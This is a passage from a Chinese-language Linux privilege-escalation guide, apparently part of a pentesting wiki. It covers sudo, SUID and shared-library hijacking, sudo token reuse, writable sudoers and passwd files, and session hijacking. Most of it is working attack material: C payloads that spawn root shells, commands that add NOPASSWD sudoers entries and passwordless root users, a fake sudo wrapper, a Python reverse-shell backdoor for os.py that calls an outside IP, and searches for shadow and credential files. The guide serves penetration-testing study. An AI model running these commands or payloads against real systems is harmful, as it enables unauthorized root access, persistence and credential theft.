在这个例子中，用户`demo`可以以`root`身份运行`vim`，现在通过添加一个ssh密钥到root目录或者调用`sh`来获取一个shell是非常简单的。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例**基于 HTB 机器 Admirer**，对**PYTHONPATH 劫持**存在**漏洞**，在以 root 身份执行脚本时可以加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 执行路径绕过

**跳转**阅读其他文件或使用**符号链接**。例如在 sudoers 文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用了**通配符** (\*)，那就更简单了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**防范措施**：[https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 命令/SUID 二进制文件没有指定命令路径

如果**sudo 权限**被赋予单个命令**而没有指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
```markdown
此技术也可用于**suid**二进制文件**执行另一个命令时没有指定路径（始终使用**_**strings**_**检查奇怪的SUID二进制文件内容）**。

[执行的有效载荷示例。](payloads-to-execute.md)

### 带命令路径的SUID二进制文件

如果**suid**二进制文件**执行另一个命令时指定了路径**，那么，您可以尝试**导出一个函数**，命名为suid文件正在调用的命令。

例如，如果suid二进制文件调用 _**/usr/sbin/service apache2 start**_，您需要尝试创建函数并导出它：
```
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid 二进制文件时，这个函数将被执行

### LD\_PRELOAD 和 **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** 是一个可选的环境变量，包含一个或多个共享库（或共享对象）的路径，加载器会在包括 C 运行时库（libc.so）在内的任何其他共享库之前加载这些库。这称为预加载库。

为了避免这种机制被用作攻击 _suid/sgid_ 可执行二进制文件的途径，如果 _ruid != euid_，加载器会忽略 _LD\_PRELOAD_。对于这些二进制文件，只有标准路径中也是 _suid/sgid_ 的库才会被预加载。

如果你在 **`sudo -l`** 的输出中找到句子：_**env\_keep+=LD\_PRELOAD**_ 并且你可以用 sudo 调用某些命令，你可以提升权限。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**提升权限**运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
如果攻击者控制了 **LD\_LIBRARY\_PATH** 环境变量，他们可以滥用类似的权限提升，因为他们控制了将要搜索库的路径。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID 二进制文件 - .so 注入

如果你发现一些带有 **SUID** 权限的奇怪二进制文件，你可以检查所有的 **.so** 文件是否**正确加载**。为此，你可以执行：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，如果你发现类似这样的内容：_pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_，你可以利用它。

创建文件 _/home/user/.config/libcalc.c_ 并输入以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
使用以下命令编译：
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
执行二进制文件。

## 共享对象劫持
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经找到了一个SUID二进制文件，它从我们有写权限的文件夹中加载库，让我们在那个文件夹中创建一个具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果您遇到错误，例如
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要有一个叫做 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个经过策划的Unix二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 与之相同，但适用于你**只能注入参数**到命令中的情况。

该项目收集了Unix二进制文件的合法功能，这些功能可以被滥用来突破限制性的shell，提升或维持提升的权限，传输文件，生成绑定和反向shell，以及促进其他后期利用任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

如果你可以访问 `sudo -l`，你可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否找到了如何利用任何sudo规则。

### 重用Sudo令牌

在这样的场景中，**你作为一个有sudo权限的用户拥有一个shell**，但你不知道用户的密码，你可以**等待他/她使用`sudo`执行某些命令**。然后，你可以**访问使用sudo的会话的令牌，并使用它来执行任何作为sudo的操作**（权限提升）。

提升权限的要求：

* 你已经作为用户 "_sampleuser_" 拥有一个shell
* "_sampleuser_" 在**过去15分钟内**（默认情况下，这是sudo令牌的持续时间，允许我们使用`sudo`而不需要输入任何密码）**使用`sudo`**执行了某些操作
* `cat /proc/sys/kernel/yama/ptrace_scope` 是 0
* 可以访问 `gdb`（你可以上传它）

（你可以临时启用 `ptrace_scope`，使用 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 或永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0`）

如果所有这些要求都满足，**你可以使用以下方式提升权限：** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **第一个漏洞**（`exploit.sh`）将在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。你可以使用它来**在你的会话中激活sudo令牌**（你不会自动获得root shell，执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* 第**二个漏洞利用**（`exploit_v2.sh`）将在 _/tmp_ 创建一个 **root拥有的带setuid的sh shell**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **第三个漏洞利用** (`exploit_v3.sh`) 将**创建一个sudoers文件**，使得**sudo令牌永久有效并允许所有用户使用sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<用户名>

如果你在文件夹中或文件夹内任何已创建文件上拥有**写权限**，你可以使用二进制文件 [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) 来**为用户和PID创建一个sudo令牌**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_ 并且你以该用户身份拥有PID 1234的shell，你可以**获得sudo权限**，无需知道密码，操作如下：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 目录内的文件配置了谁可以使用 `sudo` 以及如何使用。这些文件**默认只能由 root 用户和 root 组读取**。\
**如果**你能够**读取**这个文件，你可能能够**获取一些有趣的信息**，如果你能够**写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写入权限，你就可以滥用这个权限。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方式：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` 二进制文件的替代品之一是 OpenBSD 的 `doas`，记得检查其配置文件 `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo 劫持

如果你知道一个**用户通常连接到一台机器并使用 `sudo`** 来提升权限，并且你在该用户上下文中获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，它将以 root 身份执行你的代码，然后执行用户的命令。然后，**修改用户上下文的 $PATH**（例如在 .bash\_profile 中添加新路径），这样当用户执行 sudo 时，你的 sudo 可执行文件就会被执行。

注意，如果用户使用的是不同的 shell（不是 bash），你需要修改其他文件来添加新路径。例如 [sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改了 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) 中找到另一个例子

或者运行类似于：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示**加载配置文件的来源**。通常，此文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着将会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。这些配置文件**指向其他文件夹**，在这些文件夹中将会**搜索** **库文件**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统将在 `/usr/local/lib` 内搜索库文件**。

如果由于某些原因**用户具有写权限**在任何指示的路径上：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内的任何文件或配置文件内的任何文件夹 `/etc/ld.so.conf.d/*.conf`，他可能能够提升权限。\
查看以下页面中**如何利用这种错误配置**：

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
将 lib 复制到 `/var/tmp/flag15/` 中，程序将会按照 `RPATH` 变量指定的位置使用它。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
```markdown
然后在 `/var/tmp` 中使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 创建一个恶意库。
```
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 权限

Linux 权限为进程提供了 **root 权限可用子集**。这有效地将 root **权限分解为更小且独特的单元**。然后可以独立地将这些单元授予进程。这样，权限的完整集合被减少，降低了被利用的风险。\
阅读以下页面以**了解更多关于权限及其滥用方法**：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## 目录权限

在目录中，**"执行"位**意味着受影响的用户可以**"cd"** 进入文件夹。\
**"读取"** 位意味着用户可以**列出** **文件**，而 **"写入"** 位意味着用户可以**删除**和**创建**新的**文件**。

## ACLs

ACLs（访问控制列表）是第二级自由裁量权限，它们**可能会覆盖标准的 ugo/rwx** 权限。如果正确使用，它们可以为您提供**更好的粒度设置文件或目录的访问权限**，例如通过授予或拒绝既不是文件所有者也不是组所有者的特定用户的访问权限（来自[**这里**](https://linuxconfig.org/how-to-manage-acls-on-linux)）。\
**给予** 用户 "kali" 对一个文件的读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**从系统获取具有特定ACLs的文件：**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在**旧版本**中，您可能会**劫持**不同用户（**root**）的某些**shell**会话。\
在**最新版本**中，您只能**连接**到**您自己用户**的 screen 会话。然而，您可能会在会话中发现**有趣的信息**。

### 劫持 screen 会话

**列出 screen 会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (130).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是**旧版本 tmux**的问题。作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (131).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
检查 **HTB的Valentine box** 以获取示例。

## SSH

### Debian OpenSSL 可预测的 PRNG - CVE-2008-0166

所有在2006年9月至2008年5月13日之间在基于Debian的系统（Ubuntu，Kubuntu等）上生成的SSL和SSH密钥可能受到此漏洞的影响。\
此漏洞是在这些操作系统中创建新的ssh密钥时引起的，因为**只有32,768种可能的变体**。这意味着可以计算出所有可能性，并且**拥有ssh公钥，你可以搜索对应的私钥**。你可以在这里找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 有趣的配置值

* **PasswordAuthentication:** 指定是否允许密码认证。默认值为`no`。
* **PubkeyAuthentication:** 指定是否允许公钥认证。默认值为`yes`。
* **PermitEmptyPasswords**: 当允许密码认证时，它指定服务器是否允许登录到帐户，而无需密码字符串。默认值为`no`。

### PermitRootLogin

指定是否允许root通过ssh登录，默认值为`no`。可能的值：

* `yes`: root可以使用密码和私钥登录
* `without-password` 或 `prohibit-password`: root只能使用私钥登录
* `forced-commands-only`: Root只能使用私钥登录，并且指定了命令选项
* `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像`%h`这样的令牌，这将被替换为家目录。**你可以指定绝对路径**（以`/`开头）或**相对于用户家目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将表明，如果您尝试使用用户“**testusername**”的**私钥**登录，ssh 将会将您密钥的公钥与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH 代理转发允许您**使用本地 SSH 密钥而不是在服务器上留下**（没有密码短语的！）密钥。因此，您将能够通过 ssh **跳转**到一个**主机**，然后从那里**跳转**到另一个主机，**使用**位于您**初始主机**中的**密钥**。

您需要在 `$HOME/.ssh.config` 中像这样设置此选项：
```
Host example.com
ForwardAgent yes
```
请注意，如果`Host`是`*`，每次用户跳转到不同的机器时，那个主机都将能够访问密钥（这是一个安全问题）。

文件`/etc/ssh_config`可以**覆盖**这些**选项**，允许或拒绝此配置。\
文件`/etc/sshd_config`可以通过关键字`AllowAgentForwarding`（默认为允许）**允许**或**拒绝**ssh-agent转发。

如果您发现在环境中配置了Forward Agent，请阅读以下页面，因为**您可能能够滥用它来提升权限**：

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 有趣的文件

### 配置文件

文件`/etc/profile`和`/etc/profile.d/`下的文件是**当用户运行新的shell时执行的脚本**。因此，如果您能够**编写或修改它们中的任何一个，您就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何奇怪的配置文件脚本，你应该检查它是否包含**敏感细节**。

### Passwd/Shadow 文件

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能有备份。因此，建议**找到所有这些文件**并**检查你是否可以读取**它们，以查看文件内部是否有**哈希值**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件内找到**密码哈希**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
```markdown
然后添加用户 `hacker` 并添加生成的密码。
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在您可以使用 `su` 命令，用户名和密码都是 `hacker`

或者，您可以使用以下行来添加一个没有密码的虚拟用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
```markdown
注意：在BSD平台中，`/etc/passwd`位于`/etc/pwd.db`和`/etc/master.passwd`，同时`/etc/shadow`被重命名为`/etc/spwd.db`。

你应该检查是否可以**写入一些敏感文件**。例如，你能写入某些**服务配置文件**吗？
```
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行一个**tomcat**服务器，并且你可以**修改 /etc/systemd/ 内的 Tomcat 服务配置文件，**那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### 检查文件夹

以下文件夹可能包含备份或有趣的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（可能你无法读取最后一个，但尝试一下）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/拥有的文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite 数据库文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**可能包含密码的多个文件**。\
**另一个有趣的工具**你可以使用来做这件事是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux 和 Mac。

### 日志

如果你能读取日志，你可能会在其中找到**有趣的/机密的信息**。日志越奇怪，它可能越有趣。\
此外，一些配置得“**不好**”（被后门了？）的**审计日志**可能允许你在审计日志中**记录密码**，如这篇文章所解释的：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志组** [**adm**](interesting-groups-linux-pe/#adm-group) 将非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用凭证搜索/正则表达式

你还应该检查文件名中或内容里包含“**password**”这个词的文件，同时检查日志中的IP和电子邮件，或者哈希正则表达式。\
我不会在这里列出如何做到这一切，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python库劫持

如果你知道Python脚本将从**哪里**执行，并且你**可以写入**那个文件夹或你可以**修改Python库**，你可以修改OS库并对其进行后门处理（如果你可以写入Python脚本将要执行的位置，复制并粘贴os.py库）。

要**对库进行后门处理**，只需在os.py库的末尾添加以下行（更改IP和PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 漏洞利用

`logrotate` 存在一个漏洞，允许拥有**对日志文件的写权限**或其**任何父目录**的用户使 `logrotate` 能够**在任何位置写文件**。如果 **logrotate** 正由 **root** 执行，那么用户将能够在 _**/etc/bash\_completion.d/**_ 中写入任何文件，该文件将被任何登录的用户执行。\
因此，如果你对一个**日志文件**或其**任何父文件夹**拥有**写权限**，你可以**提升权限**（在大多数 Linux 发行版中，logrotate 每天自动作为 **root 用户**执行一次）。此外，检查除了 _/var/log_ 是否还有更多文件正在被**轮换**。

{% hint style="info" %}
此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本
{% endhint %}

关于此漏洞的更多详细信息可以在此页面找到：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用这个漏洞。

这个漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx 日志）**非常相似，所以每当你发现可以更改日志时，检查谁在管理这些日志，并检查你是否可以通过替换日志为符号链接来提升权限。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

如果，无论出于何种原因，用户能够**写入**一个 `ifcf-<whatever>` 脚本到 _/etc/sysconfig/network-scripts_ **或** 能够**调整**一个现有的，那么你的**系统就被攻破了**。

网络脚本，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，在 Linux 上它们被 Network Manager (dispatcher.d) ~源代码执行~。

在我的案例中，这些网络脚本中的 `NAME=` 属性没有被正确处理。如果你在名称中有**空白/空格，系统尝试执行空白/空格后的部分**。这意味着**第一个空格后的所有内容都以 root 身份执行**。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init、init.d、systemd 和 rc.d**

`/etc/init.d` 包含由 System V init 工具（SysVinit）使用的**脚本**。这是**Linux 的传统服务管理包**，包含 `init` 程序（内核初始化完成后运行的第一个进程¹）以及一些启动和停止服务以及配置服务的基础设施。具体来说，`/etc/init.d` 中的文件是响应 `start`、`stop`、`restart` 和（支持时）`reload` 命令来管理特定服务的 shell 脚本。这些脚本可以直接调用，或者（最常见的）通过其他触发器调用（通常是 `/etc/rc?.d/` 中的符号链接的存在）。（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。这个文件夹的另一种选择是 Redhat 中的 `/etc/rc.d/init.d`。

`/etc/init` 包含由 **Upstart** 使用的**配置**文件。Upstart 是由 Ubuntu 提倡的年轻**服务管理包**。`/etc/init` 中的文件是配置文件，告诉 Upstart 如何以及何时 `start`、`stop`、`reload` 配置或查询服务的 `status`。从 lucid 版本开始，Ubuntu 正在从 SysVinit 过渡到 Upstart，这解释了为什么许多服务即使优先使用 Upstart 配置文件，也带有 SysVinit 脚本。SysVinit 脚本由 Upstart 中的兼容层处理。（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。

**systemd** 是一个**Linux 初始化系统和服务管理器，包括按需启动守护进程**、维护挂载点和自动挂载点、快照支持以及使用 Linux 控制组跟踪进程的功能。systemd 提供了一个日志守护进程和其他工具及实用程序，以帮助处理常见的系统管理任务。（来自[这里](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)）。

从发行版仓库下载的包中的文件放在 `/usr/lib/systemd/` 中。系统管理员（用户）所做的修改放在 `/etc/systemd/system/` 中。

## 其他技巧

### NFS 权限提升

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 从受限 Shell 中逃逸

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## 内核安全保护

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[静态 impacket 二进制文件](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix 权限提升工具

